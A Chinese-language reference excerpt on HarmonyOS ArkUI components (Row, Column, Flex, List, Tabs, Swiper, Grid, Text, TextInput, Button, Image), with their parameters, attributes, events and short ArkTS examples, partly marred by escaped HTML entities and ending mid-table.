Image组件的必选参数src。\nImage(\u0026#39;https://xyz/test.jpg\u0026#39;) Text组件的非必选参数content。\n// string类型的参数 Text(\u0026#39;test\u0026#39;) // $r形式引入应用资源，可应用于多语言场景 Text($r(\u0026#39;app.string.title_value\u0026#39;)) // 无参数形式 Text() 变量或表达式也可以用于参数赋值，其中表达式返回的结果类型必须满足参数类型要求。 例如，设置变量或表达式来构造Image和Text组件的参数。\nImage(this.imagePath) Image(\u0026#39;https://\u0026#39; + this.imageUrl) Text(`count: ${this.count}`) 配置属性 属性方法以“.”链式调用的方式配置系统组件的样式和其他属性，建议每个属性方法单独写一行。 配置Text组件的字体大小。\nText(\u0026#39;test\u0026#39;) .fontSize(12) 配置组件的多个属性。\nImage(\u0026#39;test.jpg\u0026#39;) .alt(\u0026#39;error.jpg\u0026#39;) .width(100) .height(100) 除了直接传递常量参数外，还可以传递变量或表达式。\nText(\u0026#39;hello\u0026#39;) .fontSize(this.size) Image(\u0026#39;test.jpg\u0026#39;) .width(this.count % 2 === 0 ? 100 : 200) .height(this.offset + 100) 对于系统组件，ArkUI还为其属性预定义了一些枚举类型供开发者调用，枚举类型可以作为参数传 递，但必须满足参数类型要求。 例如，可以按以下方式配置Text组件的颜色和字体样式。\nText(\u0026#39;hello\u0026#39;) .fontSize(20) .fontColor(Color.Red) .fontWeight(FontWeight.Bold) 配置事件 事件方法以“.”链式调用的方式配置系统组件支持的事件，建议每个事件方法单独写一行。 使用箭头函数配置组件的事件方法。\nButton(\u0026#39;Click me\u0026#39;) .onClick(() =\u0026gt; { this.myText = \u0026#39;ArkUI\u0026#39;; }) 使用匿名函数表达式配置组件的事件方法，要求使用bind，以确保函数体中的this指向当前组件。 使用组件的成员函数配置组件的事件方法。\nButton(\u0026#39;add counter\u0026#39;) .onClick(function(){ this.counter += 2; }.bind(this)) 使用声明的箭头函数，可以直接调用，不需要bind this。\n配置子组件 如果组件支持子组件配置，则需在尾随闭包\u0026quot;{\u0026hellip;}\u0026ldquo;中为组件添加子组件的UI描述。Column、Row、 Stack、Grid、List等组件都是容器组件。 以下是简单的Column组件配置子组件的示例。\nColumn() { Text(\u0026#39;Hello\u0026#39;) .fontSize(100) Divider() Text(this.myText) .fontSize(100) .fontColor(Color.Red) } 容器组件均支持子组件配置，可以实现相对复杂的多级嵌套。\ncolumn() { Row() { Image(\u0026#39;test1.jpg\u0026#39;) .width(100) .height(100) Button(\u0026#39;click +1\u0026#39;) .onClick(() =\u0026gt; { console.info(\u0026#39;+1 clicked!\u0026#39;); }) } } 🍱组件 Row 沿水平方向布局容器。可以包含子组件。\nRow(value?:{space?: string | number}) 参数：\n参数名\n参数类型\n必填\n默认值\n参数描述\nspace\nstring | number\n否\n0\n横向布局元素间距。\n属性： 名称\n参数类型\n默认值\n描述\nalignItems\nVerticalAlign\nVerticalAlign.Center\n在垂直方向上子组件的对齐格式。\njustifyContent\nFlexAlign\nFlexAlign.Start\n设置子组件在水平方向上的对齐格式。\nColumn 沿垂直方向布局的容器。可以包含子组件。\nColumn(value?:{space?: string | number}) 参数：\n参数名\n参数类型\n必填\n默认值\n参数描述\nspace\nstring|number\n否\n0\n纵向布局元素间距。\n属性：\n名称\n参数类型\n默认值\n描述\nalignItems\nHorizontalAlign\nHorizontalAlign.Center\n设置子组件在水平方向上的对齐格式。\njustifyContent8+\nFlexAlign\nFlexAlign.Start\n设置子组件在垂直方向上的对齐格式。\nFlex以弹性方式布局子组件的容器组件。 子组件 可以包含子组件。\nFlex(value?: { direction?: FlexDirection, wrap?: FlexWrap, justifyContent?: FlexAlign, alignItems?: ItemAlign, alignContent?: FlexAlign }) 参数：\n参数名\n参数类型\n必填\n默认值\n参数描述\ndirection\nFlexDirection\n否\nFlexDirection.Row\n子组件在Flex容器上排列的方向，即主轴的方向。\nwrap\nFlexWrap\n否\nFlexWrap.NoWrap\nFlex容器是单行/列还是多行/ 列排列。\njustifyContent\nFlexAlign\n否\nFlexAlign.Start\n子组件在Flex容器主轴上的对齐格式。\nalignItems\nItemAlign\n否\nItemAlign.Stretch\n子组件在Flex容器交叉轴上的对齐格式。\nalignContent\nFlexAlign\n否\nFlexAlign.Start\n交叉轴中有额外的空间时，多行内容的对齐方式。仅在 wrap为Wrap或\nWrapReverse下生效。\nList 列表包含一系列相同宽度的列表项。适合连续、多行呈现同类数据，例如图片和文本。\nList(value?:{space?: number | string, initialIndex?: number, scroller?: Scroller}) 参数：\n参数名\n参数类型\n必填\n参数描述\nspace\nnumber\n| string\n否\n列表项间距。默认值：0\ninitialIndex\nnumber\n否\n设置当前List初次加载时视口起始位置显示的item的索引值。如果设置的值超过了当前List后一个item的索引值，则设置不生效。默认值：0\nscroller\nScroller\n否\n可滚动组件的控制器。用于与可滚动组件进行绑定。\n属性\n名称\n参数类型\n描述\nlistDirection\nAxis\n设置List组件排列方向参照Axis枚举说明。默认值：Vertical\ndivider\n{strokeWidth: Length,color?:\nResourceColor,startMargin?:\nLength,endMargin?: Length}\n| null\n用于设置ListItem分割线样式，默认无分割线。strokeWidth: 分割线的线宽。\ncolor: 分割线的颜色。startMargin： 分割线与列表侧边起始端的距离。\nendMargin: 分割线与列表侧边结束端的距离。\nscrollBar\nBarState\n设置滚动条状态。默认值：BarState.Off\ncachedCount\nnumber\n设置预加载的ListItem的数量。具体使用可参考减少应用白块说明。默认值：1\neditMode\nboolean\n声明当前List组件是否处于可编辑模式。\n默认值：false\nedgeEffect\nEdgeEffect\n滑动效果，目前支持的滑动效果参见\nEdgeEffect的枚举说明。默认值：\nEdgeEffect.Spring\nchainAnimation\nboolean\n用于设置当前list是否启用链式联动动效，开启后列表滑动以及顶部和底部拖拽时会有链式联动的效果。链式联动效果：list内的list-item间隔一定距离，在基本的滑动交互行为下，主动对象驱动从动对象进行联动，驱动效果遵循弹簧物理动效。- false：不启用链式联动。true：启用链式联动。默认值：false\nmultiSelectable 8+\nboolean\n是否开启鼠标框选。\u0026gt;默认值：falsefalse：关闭框选。- true：开启框选。\n事件 名称\n功能描述\nonItemDelete(event: (index:\nnumber) =\u0026gt; boolean)\n列表项删除时触发。\nonScroll(event: (scrollOffset: number, scrollState: ScrollState) =\u0026gt; void)\n列表滑动时触发，返回值scrollOffset为滑动偏移量， scrollState为当前滑动状态。\nonScrollIndex(event: (start:\nnumber, end: number) =\u0026gt; void)\n列表滑动时触发，返回值分别为滑动起始位置索引值与滑动结束位置索引值。\nonReachStart(event: () =\u0026gt; void)\n列表到达起始位置时触发。\nonReachEnd(event: () =\u0026gt; void)\n列表到底末尾位置时触发。\nonScrollStop(event: () =\u0026gt; void)\n列表滑动停止时触发。\nonItemMove(event: (from: number, to: number) =\u0026gt; boolean)\n列表元素发生移动时触发，返回值from、to分别为移动前索引值与移动后索引值。\nonItemDragStart(event: (event:\nItemDragInfo, itemIndex:\nnumber) =\u0026gt; ((() =\u0026gt; any) | void))\n开始拖拽列表元素时触发，返回值event见ItemDragInfo对象说明，itemIndex为被拖拽列表元素索引值。\nonItemDragEnter(event:\n(event: ItemDragInfo) =\u0026gt; void)\n拖拽进入列表元素范围内时触发，返回值event见\nItemDragInfo对象说明。\nonItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =\u0026gt; void)\n拖拽在列表元素范围内移动时触发，返回值event见\nItemDragInfo对象说明，itemIndex为拖拽起始位置， insertIndex为拖拽插入位置。\nonItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =\u0026gt; void)\n拖拽离开列表元素时触发，返回值event见ItemDragInfo对象说明，itemIndex为拖拽离开的列表元素索引值。\nonItemDrop(event: (event:\nItemDragInfo, itemIndex: number, insertIndex: number, isSuccess: boolean) =\u0026gt; void)\n绑定该事件的列表元素可作为拖拽释放目标，当在列表元素\n内停止拖拽时触发，返回值event见ItemDragInfo对象说明， itemIndex为拖拽起始位置，insertIndex为拖拽插入位置， isSuccess为是否成功释放。\nScrollState枚举说明 名称\n描述\nIdle\n未滑动状态。\nScroll\n惯性滑动状态。\nFling\n手指拖动状态。\nListItem 用来展示列表具体item，必须配合List来使用。\nListItem(value?: string) 属性\n名称\n参数类型\n默认值\n描述\nsticky\nSticky\nSticky.None\n设置ListItem吸顶效果，参见Sticky枚举描述。默认值：Sticky.None\neditable\nboolean |\nEditMode\nfalse\n当前ListItem元素是否可编辑，进入编辑模式后可删除或移动。默认值：false\nselectable 8+\nboolean\ntrue\n当前ListItem元素是否可以被鼠标框选。默认值：true说明：外层List容器的鼠标框选开启时，ListItem的框选才生效。\nSticky枚举说明 名称\n描述\nNone\n无吸顶效果。\nNormal\n当前item吸顶。\nOpacity\n当前item吸顶显示透明度变化效果。\nEditMode枚举说明 名称\n描述\nNone\n编辑操作不限制。\nDeletable\n可删除。\nMovable\n可移动。\n事件 名称\n功能描述\nonSelect(event:\n(isSelected: boolean)\n=\u0026gt; void) 8+\nListItem元素被鼠标框选的状态改变时触发回调。isSelected：进入鼠标框选范围即被选中返回true， 移出鼠标框选范围即未被选中返回 false。\nList() { ListItem() { Row() { Image($r(\u0026#39;app.media.icon\u0026#39;)).width(\u0026#39;80vp\u0026#39;) Column() { Text(\u0026#39;标題\u0026#39;) .fontColor(Color.Blue) .fontSize(\u0026#39;22fp\u0026#39;) Text(\u0026#39;描述\u0026#39;) .fontColor(Color.Gray) .fontSize(\u0026#39;22fp\u0026#39;) } } .padding({left:\u0026#39;10vp\u0026#39;}) } } .backgroundColor(Color.White) ​\nTabs 通过页签进行内容视图切换的容器组件，每个页签对应一个内容视图。\nTabs(value?: {barPosition?: BarPosition, index?: number, controller?: TabsController}) 参数\n参数名\n参数类型\n必填\n默认值\n参数描述\nbarPosition\nBarPosition\n否\nBarPosition.Start\n指定页签位置来创建Tabs容器组件。\nindex\nnumber\n否\n0\n指定初次初始页签索引。\ncontroller\nTabsController\n否\n-\n设置Tabs控制器。\nBarPosition枚举说明\n名称\n描述\nStart\nvertical属性方法设置为true时，页签位于容器左侧；vertical属性方法设置为false时，页签位于容器顶部。\nEnd\nvertical属性方法设置为true时，页签位于容器右侧；vertical属性方法设置为false时，页签位于容器底部。\n属性不支持触摸热区设置。\n名称\n参数类型\n默认值\n描述\nvertical\nboolean\nfalse\n设置为false是为横向Tabs，设置为 true时为纵向Tabs。\nscrollable\nboolean\ntrue\n设置为true时可以通过滑动页面进行页面切换，为false时不可滑动切换页面。\nbarMode\nBarMode\nBarMode.Fixed\nTabBar布局模式，具体描述见\nBarMode枚举说明。\nbarWidth\nLength\n-\nTabBar的宽度值。\nbarHeight\nLength\n-\nTabBar的高度值。\nanimationDuration\nnumber\n200\nTabContent滑动动画时长。\nBarMode枚举说明\n名称\n描述\nScrollable\nTabBar使用实际布局宽度, 超过总长度后可滑动。\nFixed\n所有TabBar平均分配宽度。\n事件\n名称\n功能描述\nonChange(event: (index: number) =\u0026gt; void)\nTab页签切换后触发的事件。- index: tab标签的索引值。\nTabsController\nTabs组件的控制器，用于控制Tabs组件进行页签切换。导入对象\ncontroller: TabsController = new TabsController() changeIndex changeIndex(value: number): void\n控制Tabs切换到指定页签。参数：\n参数名\n参数类型\n必填\n默认值\n参数描述\nvalue\nnumber\n是\n-\n页签在Tabs里的索引值，索引值从0开始。\nTabContent 仅在Tabs中使用，对应一个切换页签的内容视图。\nTabContent() 属性\n名称\n参数类型\n默认值\n描述\ntabBar\nstring |\nResource| {icon?:\nstring |\nResource,text?:\nstring |\nResource}|\nCustomBuilder8+\n-\n设置TabBar上显示内容。CustomBuilder: 构造器，内部可以传入组件（API8版本以上适用）。说明：如果 icon采用svg格式图源，则要求svg图源删除其自有宽高属性值。如采用带有自有宽高属性的svg图源，icon大小则是svg本身内置的宽高属性值大小。\nSwiper 滑块视图容器，提供子组件滑动轮播显示的能力。 参数\n参数名\n参数类型\n必填\n参数描述\ncontroller\nSwiperController\n否\n给组件绑定一个控制器，用来控制组件翻页。\n属性\n名称\n参数类型\n描述\nindex\nnumber\n设置当前在容器中显示的子组件的索引值。默认值：0\nautoPlay\nboolean\n子组件是否自动播放，自动播放状态下，导航点不可操作。默认值：false\ninterval\nnumber\n使用自动播放时播放的时间间隔，单位为毫秒。默认值：3000\nindicator\nboolean\n是否启用导航点指示器。默认值：true\nloop\nboolean\n是否开启循环。设置为true时表示开启循环，在LazyForEach懒循环加载模式\n下，加载的组件数量建议大于5个。默认值：true\nduration\nnumber\n子组件切换的动画时长，单位为毫秒。\n默认值：400\nvertical\nboolean\n是否为纵向滑动。默认值：false\nitemSpace\nnumber | string\n设置子组件与子组件之间间隙。默认值：0\ndisplayMode\nSwiperDisplayMode\n设置子组件显示模式。默认值：\nSwiperDisplayMode.Stretch\ncachedCount 8+\nnumber\n设置预加载子组件个数。默认值：1\ndisableSwipe 8+\nboolean\n禁用组件滑动切换功能。默认值：false\ndisplayCount 8+\nnumber | string\n设置一页中显示子组件的个数，设置为\n“auto”时等同于\nSwiperDisplayMode.AutoLinear的显示\n效果。默认值：1\neffectMode 8+\nEdgeEffect\n设置滑动到边缘时的显示效果。默认值：EdgeEffect.Spring\ncurve 8+\nCurve | string\n设置Swiper的动画曲线，默认为淡入淡出曲线\nindicatorStyle 8+\n{left?: Length,top?:\nLength,right?:\nLength,bottom?: Length,size?:\nLength,mask?: boolean,color?:\nResourceColor,selectedColor?:\nResourceColor}\n设置导航点样式：- left: 设置导航点距离\nSwiper组件左边的距离。- top: 设置导\n航点距离Swiper组件顶部的距离。right: 设置导航点距离Swiper组件右边的距离。- bottom: 设置导航点距离\nSwiper组件底部的距离。- size: 设置导航点的直径。- mask: 设置是否显示导航\n点蒙层样式。- color: 设置导航点的颜\n色。- selectedColor: 设置选中的导航点的颜色。\nSwiperDisplayMode枚举说明\n名称\n描述\nStretch\nSwiper滑动一页的宽度为Swiper组件自身的宽度。\nAutoLinear\nSwiper滑动一页的宽度为子组件宽度中的 大值。\nEdgeEffect枚举说明 名称\n描述\nSpring\n弹性物理动效，滑动到边缘后可以通过触摸事件继续滑动一段距离，松手后回弹。\nFade\n滑动到边缘后，可以通过触摸事件继续滑动一段阴影，松手后阴影回弹。\nNone\n滑动到边缘后无效果。\nSwiperController Swiper容器组件的控制器，可以将此对象绑定至Swiper组件，然后通过它控制翻页。\nshowNext\nshowNext(): void 翻至下一页。 showPrevious\nshowPrevious(): void 翻至上一页。 finishAnimation\nfinishAnimation(callback?: () =\u0026gt; void): void 停止播放动画。参数：\n参数名\n参数类型\n必填项\n参数描述\ncallback\n() =\u0026gt; void\n是\n动画结束的回调。\n事件 onChange\nonChange(event: (index: number) =\u0026gt; void) 当前显示的组件索引变化时触发该事件，返回值为当前显示的子组件的索引值。\n参数\n参数名\n参数类型\n必填项\n参数描述\nindex\nnumber\n是\n当前显示元素的索引。\nGrid 网格容器，由“行”和“列”分割的单元格所组成，通过指定“项目”所在的单元格做出各种各样的布局。\nGrid(scroller?: Scroller) 参数\n参数名\n参数类型\n必填\n参数描述\nscroller\nScroller\n否\n可滚动组件的控制器。用于与可滚动组件进行绑定。\n属性\n名称\n参数类型\n描述\ncolumnsTemplate\nstring\n设置当前网格布局列的数量，不设置时默认1列。例\n如, '1fr 1fr 2fr' 是将父组件分3列，将父组件允许的宽分为4等份，第一列占1份，第二列占1份，第三列占2 份。默认值：'1fr'\nrowsTemplate\nstring\n设置当前网格布局行的数量，不设置时默认1行。例如, '1fr 1fr 2fr'是将父组件分三行，将父组件允许的\n高分为4等份，第一行占1份，第二行占一份，第三行占2份。默认值：'1fr'\ncolumnsGap\nLength\n设置列与列的间距。默认值：0\nrowsGap\nLength\n设置行与行的间距。默认值：0\nscrollBar\nBarState\n设置滚动条状态。默认值：BarState.Off\nscrollBarColor\nstring |\nnumber |\nColor\n设置滚动条的颜色。\nscrollBarWidth\nstring |\nnumber\n设置滚动条的宽度。\ncachedCount\nnumber\n设置预加载的GridItem的数量。具体使用可参考减少应用白块说明。默认值：1\neditMode 8+\nboolean\n是否进入编辑模式，进入编辑模式可以拖拽Grid组件内部GridItem。默认值：false\nlayoutDirection 8+\nGridDirection\n设置布局的主轴方向。默认值：GridDirection.Row\nmaxCount 8+\nnumber\n当layoutDirection是Row/RowReverse时，表示可显示的 大行数当layoutDirection是\nColumn/ColumnReverse时，表示可显示的 大列\n数。默认值：1\nminCount 8+\nnumber\n当layoutDirection是Row/RowReverse时，表示可显示的 小行数。当layoutDirection是\nColumn/ColumnReverse时，表示可显示的 小列\n数。默认值：1\ncellLength 8+\nnumber\n当layoutDirection是Row/RowReverse时，表示一行的高度。当layoutDirection是\nColumn/ColumnReverse时，表示一列的宽度。默\n认值：0\nmultiSelectable 8+\nboolean\n是否开启鼠标框选。- false：关闭框选。- true：开启框选。默认值：false\nsupportAnimation 8+\nboolean\n是否支持动画。默认值：false\nGridDirection枚举说明8+\n名称\n描述\nRow\n主轴布局方向沿水平方向布局，即自左往右先填满一行，再去填下一行。\nColumn\n主轴布局方向沿垂直方向布局，即自上往下先填满一列，再去填下一列。\nRowReverse\n主轴布局方向沿水平方向反向布局，即自右往左先填满一行，再去填下一行。\nColumnReverse\n主轴布局方向沿垂直方向反向布局，即自下往上先填满一列，再去填下一列。\n事件 名称\n功能描述\nonScrollIndex(event: (first: number) =\u0026gt; void)\n当前网格显示的起始位置item发生变化\n时触发。- first: 当前显示的网格起始位置的索引值。\nonItemDragStart(event: (event: ItemDragInfo, itemIndex: number) =\u0026gt; (() =\u0026gt; any) | void)\n开始拖拽网格元素时触发。\nonItemDragEnter(event: (event: ItemDragInfo) =\u0026gt; void)\n拖拽进入网格元素范围内时触发。\nonItemDragMove(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number) =\u0026gt; void)\n拖拽在网格元素范围内移动时触发。\nonItemDragLeave(event: (event: ItemDragInfo, itemIndex: number) =\u0026gt; void)\n拖拽离开网格元素时触发。\nonItemDrop(event: (event: ItemDragInfo, itemIndex: number, insertIndex: number,\nisSuccess: boolean) =\u0026gt; void)\n绑定该事件的网格元素可作为拖拽释放目标，当在网格元素内停止拖拽时触发。\nItemDragInfo对象说明\n名称\n类型\n描述\nx\nnumber\n当前拖拽点的x坐标。\ny\nnumber\n当前拖拽点的y坐标。\nGridItem 网格容器中单项内容容器。\nGridItem() 属性\n名称\n参数类型\n描述\nrowStart\nnumber\n指定当前元素起始行号。\nrowEnd\nnumber\n指定当前元素终点行号。\ncolumnStart\nnumber\n指定当前元素起始列号。\ncolumnEnd\nnumber\n指定当前元素终点列号。\nforceRebuild\nboolean\n设置在触发组件build时是否重新创建此节点。默认值：false\nselectable8+\nboolean\n当前GridItem元素是否可以被鼠标框选。默认值：true说明：外层\nGrid容器的鼠标框选开启时，GridItem的框选才生效。\n事件\n名称\n功能描述\nonSelect(event:\n(isSelected: boolean)\n=\u0026gt; void)8+\nGridItem元素被鼠标框选的状态改变时触发回调。isSelected：进入鼠标框选范围即被选中，返回true；移出鼠标框选范围即未被选中，返回 false。\nGrid() { // 第一行 GridItem() { Text(\u0026#39;1\u0026#39;) } .height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) GridItem() { Text(\u0026#39;2\u0026#39;) }.height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) GridItem() { Text(\u0026#39;3\u0026#39;) }.height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) GridItem() { Text(\u0026#39;4\u0026#39;) }.height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) GridItem() { Text(\u0026#39;5\u0026#39;) }.height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) // GridItem() { // Text(\u0026#39;6\u0026#39;) // }.height(\u0026#39;20%\u0026#39;).width(\u0026#39;20%\u0026#39;) }.height(\u0026#39;30%\u0026#39;).width(\u0026#39;30%\u0026#39;) ​\n基础组件\nText 显示一段文本的组件。可以包含Span子组件。\nText(content?: string | Resource) Text(this.message) .fontSize(20) .fontWeight(FontWeight.Bold) 属性\n名称\n参数类型\n描述\ntextAlign\nTextAlign\n设置多行文本的文本对齐方式。默认值：\nTextAlign.Start\ntextOverflow\n{overflow: TextOverflow}\n设置文本超长时的显示方式。默认值：\n{overflow: TextOverflow.Clip}说明：文本截断是按字截断。例如，英文以单词为 小单\n位进行截断，若需要以字母为单位进行截断，可在字母间添加零宽空格：\\u200B。\nmaxLines\nnumber\n设置文本的 大行数。默认值：Infinity\nlineHeight\nstring | number |\nResource\n设置文本的文本行高，设置值不大于0时，不限制文本行高，自适应字体大小，Length为 number类型时单位为fp。\ndecoration\n{type:\nTextDecorationType,color?:\nResourceColor}\n设置文本装饰线样式及其颜色。默认值：\n{type: TextDecorationType.None,color：\nColor.Black}\nbaselineOffset\nnumber | string\n设置文本基线的偏移量。\nletterSpacing\nnumber | string\n设置文本字符间距。\nminFontSize\nnumber | string |\nResource\n设置文本 小显示字号。\nmaxFontSize\nnumber | string |\nResource\n设置文本 大显示字号。\ntextCase\nTextCase\n设置文本大小写。默认值：\nTextCase.Normal\nTextInput\n单行文本输入框组件。\n子组件 无\nTextInput(value?:{placeholder?: ResourceStr, text?: ResourceStr, controller?: TextInputController}) 参数\n参数名\n参数类型\n必填\n参数描述\nplaceholder\nResourceStr\n否\n无输入时的提示文本。\ntext\nResourceStr\n否\n设置输入框当前的文本内容。\ncontroller8+\nTextInputController\n否\n设置TextInput控制器。\n属性 名称\n参数类型\n描述\ntype\nInputType\n设置输入框类型。默认值：InputType.Normal\nplaceholderColor\nResourceColor\n设置placeholder颜色。\nplaceholderFont\nFont\n设置placeholder文本样式：- size: 设置文本尺寸，Length为number类型时，使用fp单位。weight: 设置文本的字体粗细，number类型取值\n[100, 900]，取值间隔为100，默认为400，取值越大，字体越粗。- family: 设置文本的字体列表。使\n用多个字体，使用','进行分割，优先级按顺序生\n效。例如：'Arial, sans-serif'。- style: 设置文本的字体样式。\nenterKeyType\nEnterKeyType\n设置输入法回车键类型。默认值：\nEnterKeyType.Done\ncaretColor\nResourceColor\n设置输入框光标颜色。\nmaxLength\nnumber\n设置文本的 大输入字符数。\ninputFilter8+\n{value:\nResourceStr,error?: (value: string) =\u0026gt; void}\n正则表达式，满足表达式的输入允许显示，不满足正则表达式的输入被忽略。仅支持单个字符匹配，不支持字符串匹配。例如：^(?=.\\d)(?=.[a-z])(?=.* [A-Z]).{8,10}$，8到10位的强密码不支持过滤。value：设置正则表达式。- error：正则匹配失败时，返回被忽略的内容。\nEnterKeyType枚举说明\n名称\n描述\nGo\n显示Go文本。\nSearch\n显示为搜索样式。\nSend\n显示为发送样式。\nNext\n显示为下一个样式。\nDone\n标准样式。\nInputType枚举说明 名称\n描述\nNormal\n基本输入模式。\nPassword\n密码输入模式。\nEmail\ne-mail地址输入模式。\nNumber\n纯数字输入模式。\n事件\n名称\n功能描述\nonChange(callback: (value: string) =\u0026gt; void)\n输入发生变化时，触发回调。\nonSubmit(callback: (enterKey:\nEnterKeyType) =\u0026gt; void)\n回车键或者软键盘回车键触发该回调，参数为当前软键盘回车键类型。\nonEditChanged(callback: (isEditing:\nboolean) =\u0026gt; void)(deprecated)\n输入状态变化时，触发回调。\nonEditChange(callback: (isEditing:\nboolean) =\u0026gt; void) 8+\n输入状态变化时，触发回调。\nonCopy8+(callback:(value: string) =\u0026gt; void)\n长按输入框内部区域弹出剪贴板后，点击剪切板复制按钮，触发回调。value：复制的文本内容。\nonCut8+(callback:(value: string) =\u0026gt; void)\n长按输入框内部区域弹出剪贴板后，点击剪切板剪切按钮，触发回调。value：剪切的文本内容。\nonPaste8+(callback:(value: string) =\u0026gt; void)\n长按输入框内部区域弹出剪贴板后，点击剪切板粘贴按钮，触发回调。value：粘贴的文本内容。\nTextInput() .padding({top:\u0026#39;5vp\u0026#39;}) .margin({top:\u0026#39;5vp\u0026#39;}) ​ TextInputController 8+\nTextInput组件的控制器。\n导入对象\ncontroller: TextInputController = new TextInputController() caretPosition caretPosition(value: number): void 设置光标移动到指定位置。参数：\n\u0026lt;div class=\u0026#34;table-box\u0026#34;\u0026gt;\u0026lt;table border=\u0026#34;1\u0026#34; cellspacing=\u0026#34;0\u0026#34; style=\u0026#34;margin-left:.3pt;width:444.2pt;\u0026#34;\u0026gt;\u0026lt;tbody\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;td style=\u0026#34;background-color:#f8f8f8;border-color:#dfe2e5;width:45.1pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:.1pt;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;参数名\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;background-color:#f8f8f8;border-color:#dfe2e5;width:57.05pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0cm;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;参数类型\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;background-color:#f8f8f8;border-color:#dfe2e5;width:36pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0cm;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;必填\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;background-color:#f8f8f8;border-color:#dfe2e5;width:306.05pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;\u0026lt;strong\u0026gt;参数描述\u0026lt;/strong\u0026gt;\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;td style=\u0026#34;border-color:#dfe2e5;width:45.1pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0cm;text-align:center;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;value\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;width:57.05pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;number\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;width:36pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;是\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;td style=\u0026#34;width:306.05pt;\u0026#34;\u0026gt; \u0026lt;p style=\u0026#34;margin-left:0;\u0026#34;\u0026gt;\u0026lt;span style=\u0026#34;color:#333333;\u0026#34;\u0026gt;设置输入光标的位置。value：从字符串开始到光标所在位置的字符长度。\u0026lt;/span\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;/tbody\u0026gt;\u0026lt;/table\u0026gt;\u0026lt;/div\u0026gt; Button 按钮组件，可快速创建不同样式的按钮。\n接口\n方法1：\nButton(options?: {type?: ButtonType, stateEffect?: boolean}) 参数\n参数名\n参数类型\n必填\n参数描述\ntype\nButtonType\n否\n描述按钮显示样式。默认值：ButtonType.Capsule\nstateEffect\nboolean\n否\n按钮按下时是否开启按压态显示效果，当设置为false时，按压效果关闭。。默认值：true\n方法 Button(label?: ResourceStr, options?: { type?: ButtonType, stateEffect?: boolean }) 使用文本内容创建相应的按钮组件，此时Button无法包含子组件。参数：\n参数名\n参数类型\n必填\n参数描述\nlabel\nResourceStr\n否\n按钮文本内容。\noptions\n{type?: ButtonType,stateEffect?: boolean}\n否\n见方法1参数说明。\n属性\n名称\n参数类型\n描述\ntype\nButtonType\n设置Button样式。默认值：ButtonType.Capsule\nstateEffect\nboolean\n按钮按下时是否开启按压态显示效果，当设置为false时，按压效果关闭。默认值：true\nButtonType枚举说明 名称\n描述\nCapsule\n胶囊型按钮（圆角默认为高度的一半）。\nCircle\n圆形按钮。\nNormal\n普通按钮（默认不带圆角）。\nButton() { Text(\u0026#39;点击\u0026#39;) } .width(\u0026#39;100fp\u0026#39;) .backgroundColor(Color.Gray) .padding({top:\u0026#39;5vp\u0026#39;}) .margin({top:\u0026#39;5vp\u0026#39;}) Image 图片组件，支持本地图片和网络图片的渲染展示。\n``` javascript Image(src: string | PixelMap | Resource) ``` 参数\n参数名\n参数类型\n必填\n默认值\n参数描述\nsrc\nstring| PixelMap|\nResource\n是\n-\n图片的数据源，支持本地图片和网络图片。当使用相对路径\n引用图片资源时，例如Image(\"common/test.jpg\")，不支持该Image组件被跨包/跨模块调用，建议使用$r方式来管理需全局使用的图片资源。- 支持的图片格式包括png、jpg、 bmp、svg和gif。- 支持Base64字符串。格式\ndata:image/[png|jpeg|bmp|webp];base64,[base64 data], 其中[base64 data]为Base64字符串数据。- 支持 dataability://路径前缀的字符串，用于访问通过data ability 提供的图片路径。\n属性\n名称\n参数类型\n默认值\n描述\nalt\nstring | 